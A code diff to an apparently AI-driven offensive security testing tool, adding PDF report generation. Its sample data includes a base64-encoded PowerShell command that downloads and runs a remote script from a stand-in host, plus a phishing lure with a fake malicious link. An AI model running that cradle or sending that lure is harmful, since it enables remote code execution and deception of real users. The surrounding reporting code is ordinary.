@@ -20,8 +20,13 @@ try:
     from transformers import AutoTokenizer, AutoModelForCausalLM, pipeline
     import requests
     from rich.console import Console
-    from rich.table import Table
+    from rich.table import Table as RichTable
     from rich.progress import Progress, SpinnerColumn, TextColumn
+    from reportlab.lib.pagesizes import letter, A4
+    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table as PDFTable, TableStyle
+    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+    from reportlab.lib.units import inch
+    from reportlab.lib import colors
 except ImportError as e:
     print(f"Missing required dependency: {e}")
     print("Please install requirements: pip install -r requirements.txt")
@@ -350,32 +355,236 @@ class OffensiveSecurityAI:
         
         return found
     
-    def generate_report(self, output_file: str = "security_test_report.json"):
-        """Generate comprehensive security test report"""
-        report = {
+    def generate_sample_data(self):
+        """Generate sample data for testing PDF functionality"""
+        return {
             "test_metadata": {
                 "timestamp": datetime.now().isoformat(),
                 "model_used": self.model_name,
                 "device": self.device,
                 "target_os": self.target_os
             },
-            "attack_results": self.attack_results,
+            "attack_results": [
+                {
+                    "attack_type": "payload",
+                    "target": "127.0.0.1",
+                    "success": True,
+                    "timestamp": datetime.now().isoformat(),
+                    "payload": "powershell -enc aW52b2tlLWV4cHJlc3Npb24gKG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXhhbXBsZS5jb20vc2NyaXB0LnBzMScp",
+                    "results": {
+                        "analysis": {
+                            "length": 120,
+                            "contains_powershell": True,
+                            "contains_base64": True,
+                            "suspicious_commands": ["invoke-expression", "downloadstring"]
+                        }
+                    }
+                },
+                {
+                    "attack_type": "phishing",
+                    "target": "test@company.com",
+                    "success": True,
+                    "timestamp": datetime.now().isoformat(),
+                    "payload": "Dear User, Your account will be suspended. Click here to verify: http://malicious-link.com/verify",
+                    "results": {
+                        "analysis": {
+                            "length": 85,
+                            "contains_powershell": False,
+                            "contains_base64": False,
+                            "suspicious_commands": []
+                        }
+                    }
+                }
+            ],
             "summary": {
-                "total_tests": len(self.attack_results),
-                "successful_tests": sum(1 for r in self.attack_results if r.get("success", False))
+                "total_tests": 2,
+                "successful_tests": 2
             }
         }
+    
+    def generate_pdf_report(self, output_file: str = "security_test_report.pdf", use_sample_data: bool = False):
+        """
+        Generate PDF report from attack results
         
-        try:
-            with open(output_file, 'w') as f:
-                json.dump(report, f, indent=2)
+        Args:
+            output_file: Output PDF file name
+            use_sample_data: Use sample data instead of actual attack results
             
-            logger.info(f"Report saved to {output_file}")
-            return report
+        Returns:
+            bool: True if successful, False otherwise
+        """
+        try:
+            # Use sample data or actual attack results
+            if use_sample_data:
+                data = self.generate_sample_data()
+            else:
+                data = {
+                    "test_metadata": {
+                        "timestamp": datetime.now().isoformat(),
+                        "model_used": self.model_name,
+                        "device": self.device,
+                        "target_os": self.target_os
+                    },
+                    "attack_results": self.attack_results,
+                    "summary": {
+                        "total_tests": len(self.attack_results),
+                        "successful_tests": sum(1 for r in self.attack_results if r.get("success", False))
+                    }
+                }
+            
+            # Create PDF document
+            doc = SimpleDocTemplate(output_file, pagesize=A4)
+            styles = getSampleStyleSheet()
+            story = []
+            
+            # Custom styles
+            title_style = ParagraphStyle(
+                'CustomTitle',
+                parent=styles['Heading1'],
+                fontSize=24,
+                spaceAfter=30,
+                textColor=colors.darkblue,
+                alignment=1  # Center alignment
+            )
+            
+            heading_style = ParagraphStyle(
+                'CustomHeading',
+                parent=styles['Heading2'],
+                fontSize=16,
+                spaceAfter=12,
+                textColor=colors.darkgreen
+            )
+            
+            # Title
+            story.append(Paragraph("Offensive Security Test Report", title_style))
+            story.append(Spacer(1, 20))
+            
+            # Metadata section
+            story.append(Paragraph("Test Metadata", heading_style))
+            metadata = data.get('test_metadata', {})
+            
+            metadata_data = [
+                ['Timestamp', metadata.get('timestamp', 'N/A')],
+                ['Model Used', metadata.get('model_used', 'N/A')],
+                ['Device', metadata.get('device', 'N/A')],
+                ['Target OS', metadata.get('target_os', 'N/A')]
+            ]
+            
+            metadata_table = PDFTable(metadata_data, colWidths=[2*inch, 4*inch])
+            metadata_table.setStyle(TableStyle([
+                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
+                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
+                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
+                ('FONTSIZE', (0, 0), (-1, 0), 12),
+                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
+                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
+                ('GRID', (0, 0), (-1, -1), 1, colors.black)
+            ]))
+            
+            story.append(metadata_table)
+            story.append(Spacer(1, 20))
+            
+            # Summary section
+            story.append(Paragraph("Test Summary", heading_style))
+            summary = data.get('summary', {})
+            
+            summary_data = [
+                ['Total Tests', str(summary.get('total_tests', 0))],
+                ['Successful Tests', str(summary.get('successful_tests', 0))],
+                ['Success Rate', f"{(summary.get('successful_tests', 0) / max(summary.get('total_tests', 1), 1) * 100):.1f}%"]
+            ]
+            
+            summary_table = PDFTable(summary_data, colWidths=[2*inch, 4*inch])
+            summary_table.setStyle(TableStyle([
+                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
+                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
+                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
+                ('FONTSIZE', (0, 0), (-1, 0), 12),
+                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
+                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
+                ('GRID', (0, 0), (-1, -1), 1, colors.black)
+            ]))
+            
+            story.append(summary_table)
+            story.append(Spacer(1, 20))
+            
+            # Attack Results section
+            story.append(Paragraph("Attack Results", heading_style))
+            attack_results = data.get('attack_results', [])
+            
+            if attack_results:
+                for i, result in enumerate(attack_results, 1):
+                    story.append(Paragraph(f"Test {i}: {result.get('attack_type', 'Unknown')}", styles['Heading3']))
+                    
+                    # Test details
+                    test_data = [
+                        ['Attack Type', result.get('attack_type', 'N/A')],
+                        ['Target', result.get('target', 'N/A')],
+                        ['Status', 'Success' if result.get('success', False) else 'Failed'],
+                        ['Timestamp', result.get('timestamp', 'N/A')]
+                    ]
+                    
+                    test_table = PDFTable(test_data, colWidths=[1.5*inch, 4.5*inch])
+                    test_table.setStyle(TableStyle([
+                        ('BACKGROUND', (0, 0), (-1, 0), colors.lightgrey),
+                        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+                        ('FONTNAME', (0, 0), (-1, -1), 'Helvetica'),
+                        ('FONTSIZE', (0, 0), (-1, -1), 10),
+                        ('GRID', (0, 0), (-1, -1), 1, colors.black)
+                    ]))
+                    
+                    story.append(test_table)
+                    story.append(Spacer(1, 12))
+                    
+                    # Payload analysis if available
+                    if 'results' in result and 'analysis' in result['results']:
+                        analysis = result['results']['analysis']
+                        story.append(Paragraph("Payload Analysis", styles['Heading4']))
+                        
+                        analysis_data = [
+                            ['Length', str(analysis.get('length', 'N/A'))],
+                            ['Contains PowerShell', 'Yes' if analysis.get('contains_powershell', False) else 'No'],
+                            ['Contains Base64', 'Yes' if analysis.get('contains_base64', False) else 'No'],
+                            ['Suspicious Commands', ', '.join(analysis.get('suspicious_commands', []))]
+                        ]
+                        
+                        analysis_table = PDFTable(analysis_data, colWidths=[1.5*inch, 4.5*inch])
+                        analysis_table.setStyle(TableStyle([
+                            ('BACKGROUND', (0, 0), (-1, 0), colors.lightgrey),
+                            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+                            ('FONTNAME', (0, 0), (-1, -1), 'Helvetica'),
+                            ('FONTSIZE', (0, 0), (-1, -1), 10),
+                            ('GRID', (0, 0), (-1, -1), 1, colors.black)
+                        ]))
+                        
+                        story.append(analysis_table)
+                        story.append(Spacer(1, 12))
+                    
+                    # Payload content (truncated for security)
+                    if 'payload' in result:
+                        payload = result['payload']
+                        if len(payload) > 200:
+                            payload_preview = payload[:200] + "... [truncated for security]"
+                        else:
+                            payload_preview = payload
+                        
+                        story.append(Paragraph("Payload Preview:", styles['Heading4']))
+                        story.append(Paragraph(f"<font name='Courier'>{payload_preview}</font>", styles['Normal']))
+                        story.append(Spacer(1, 12))
+            else:
+                story.append(Paragraph("No attack results available.", styles['Normal']))
+            
+            # Build PDF
+            doc.build(story)
+            logger.info(f"PDF report generated successfully: {output_file}")
+            return True
             
         except Exception as e:
-            logger.error(f"Failed to generate report: {e}")
-            return None
+            logger.error(f"Failed to generate PDF report: {e}")
+            return False
+    
     
     def display_results(self):
         """Display test results in a formatted table"""
@@ -383,7 +592,7 @@ class OffensiveSecurityAI:
             console.print("[yellow]No attack results to display[/yellow]")
             return
         
-        table = Table(title="Offensive Security Test Results")
+        table = RichTable()
         table.add_column("Attack Type", style="cyan")
         table.add_column("Target", style="magenta")
         table.add_column("Status", style="green")
@@ -398,6 +607,8 @@ class OffensiveSecurityAI:
                 result.get("timestamp", "Unknown")
             )
         
+        console.print()
+        console.print("[bold blue]Offensive Security Test Results[/bold blue]")
         console.print(table)
 
 def main():
@@ -408,10 +619,31 @@ def main():
                        default="payload", help="Type of attack to generate")
     parser.add_argument("--scan-type", choices=["basic", "comprehensive", "stealth"], 
                        default="basic", help="Type of reconnaissance scan")
-    parser.add_argument("--output", default="security_test_report.json", help="Output report file")
+    parser.add_argument("--output", default="security_test_report.pdf", help="Output PDF report file")
+    parser.add_argument("--sample-only", action="store_true", help="Generate sample PDF report without running tests")
     parser.add_argument("--device", choices=["auto", "cpu", "cuda"], default="cpu", help="Device to run model on")
     
     args = parser.parse_args()
+    
+    # Sample-only mode
+    if args.sample_only:
+        try:
+            ai_security = OffensiveSecurityAI()
+            console.print("[bold green]📄 Generating sample PDF report...[/bold green]")
+            success = ai_security.generate_pdf_report(args.output, use_sample_data=True)
+            
+            if success:
+                console.print(f"[bold green]✅ Sample PDF report generated: {args.output}[/bold green]")
+            else:
+                console.print("[red]❌ Failed to generate sample PDF report[/red]")
+                sys.exit(1)
+                
+        except Exception as e:
+            console.print(f"\n[red]❌ Error: {e}[/red]")
+            logger.error(f"Sample PDF generation failed: {e}")
+            sys.exit(1)
+        
+        return
     
     try:
         # Initialize the AI security testing framework
@@ -449,9 +681,14 @@ def main():
         console.print("\n[bold blue]📊 Test Results:[/bold blue]")
         ai_security.display_results()
         
-        # Generate report
-        console.print(f"\n[bold green]📄 Generating report: {args.output}[/bold green]")
-        ai_security.generate_report(args.output)
+        # Generate PDF report
+        console.print(f"\n[bold green]📄 Generating PDF report: {args.output}[/bold green]")
+        success = ai_security.generate_pdf_report(args.output)
+        
+        if success:
+            console.print(f"[bold green]✅ PDF report generated: {args.output}[/bold green]")
+        else:
+            console.print("[red]❌ Failed to generate PDF report[/red]")
         
         console.print("\n[bold green]✅ Security testing completed![/bold green]")
         
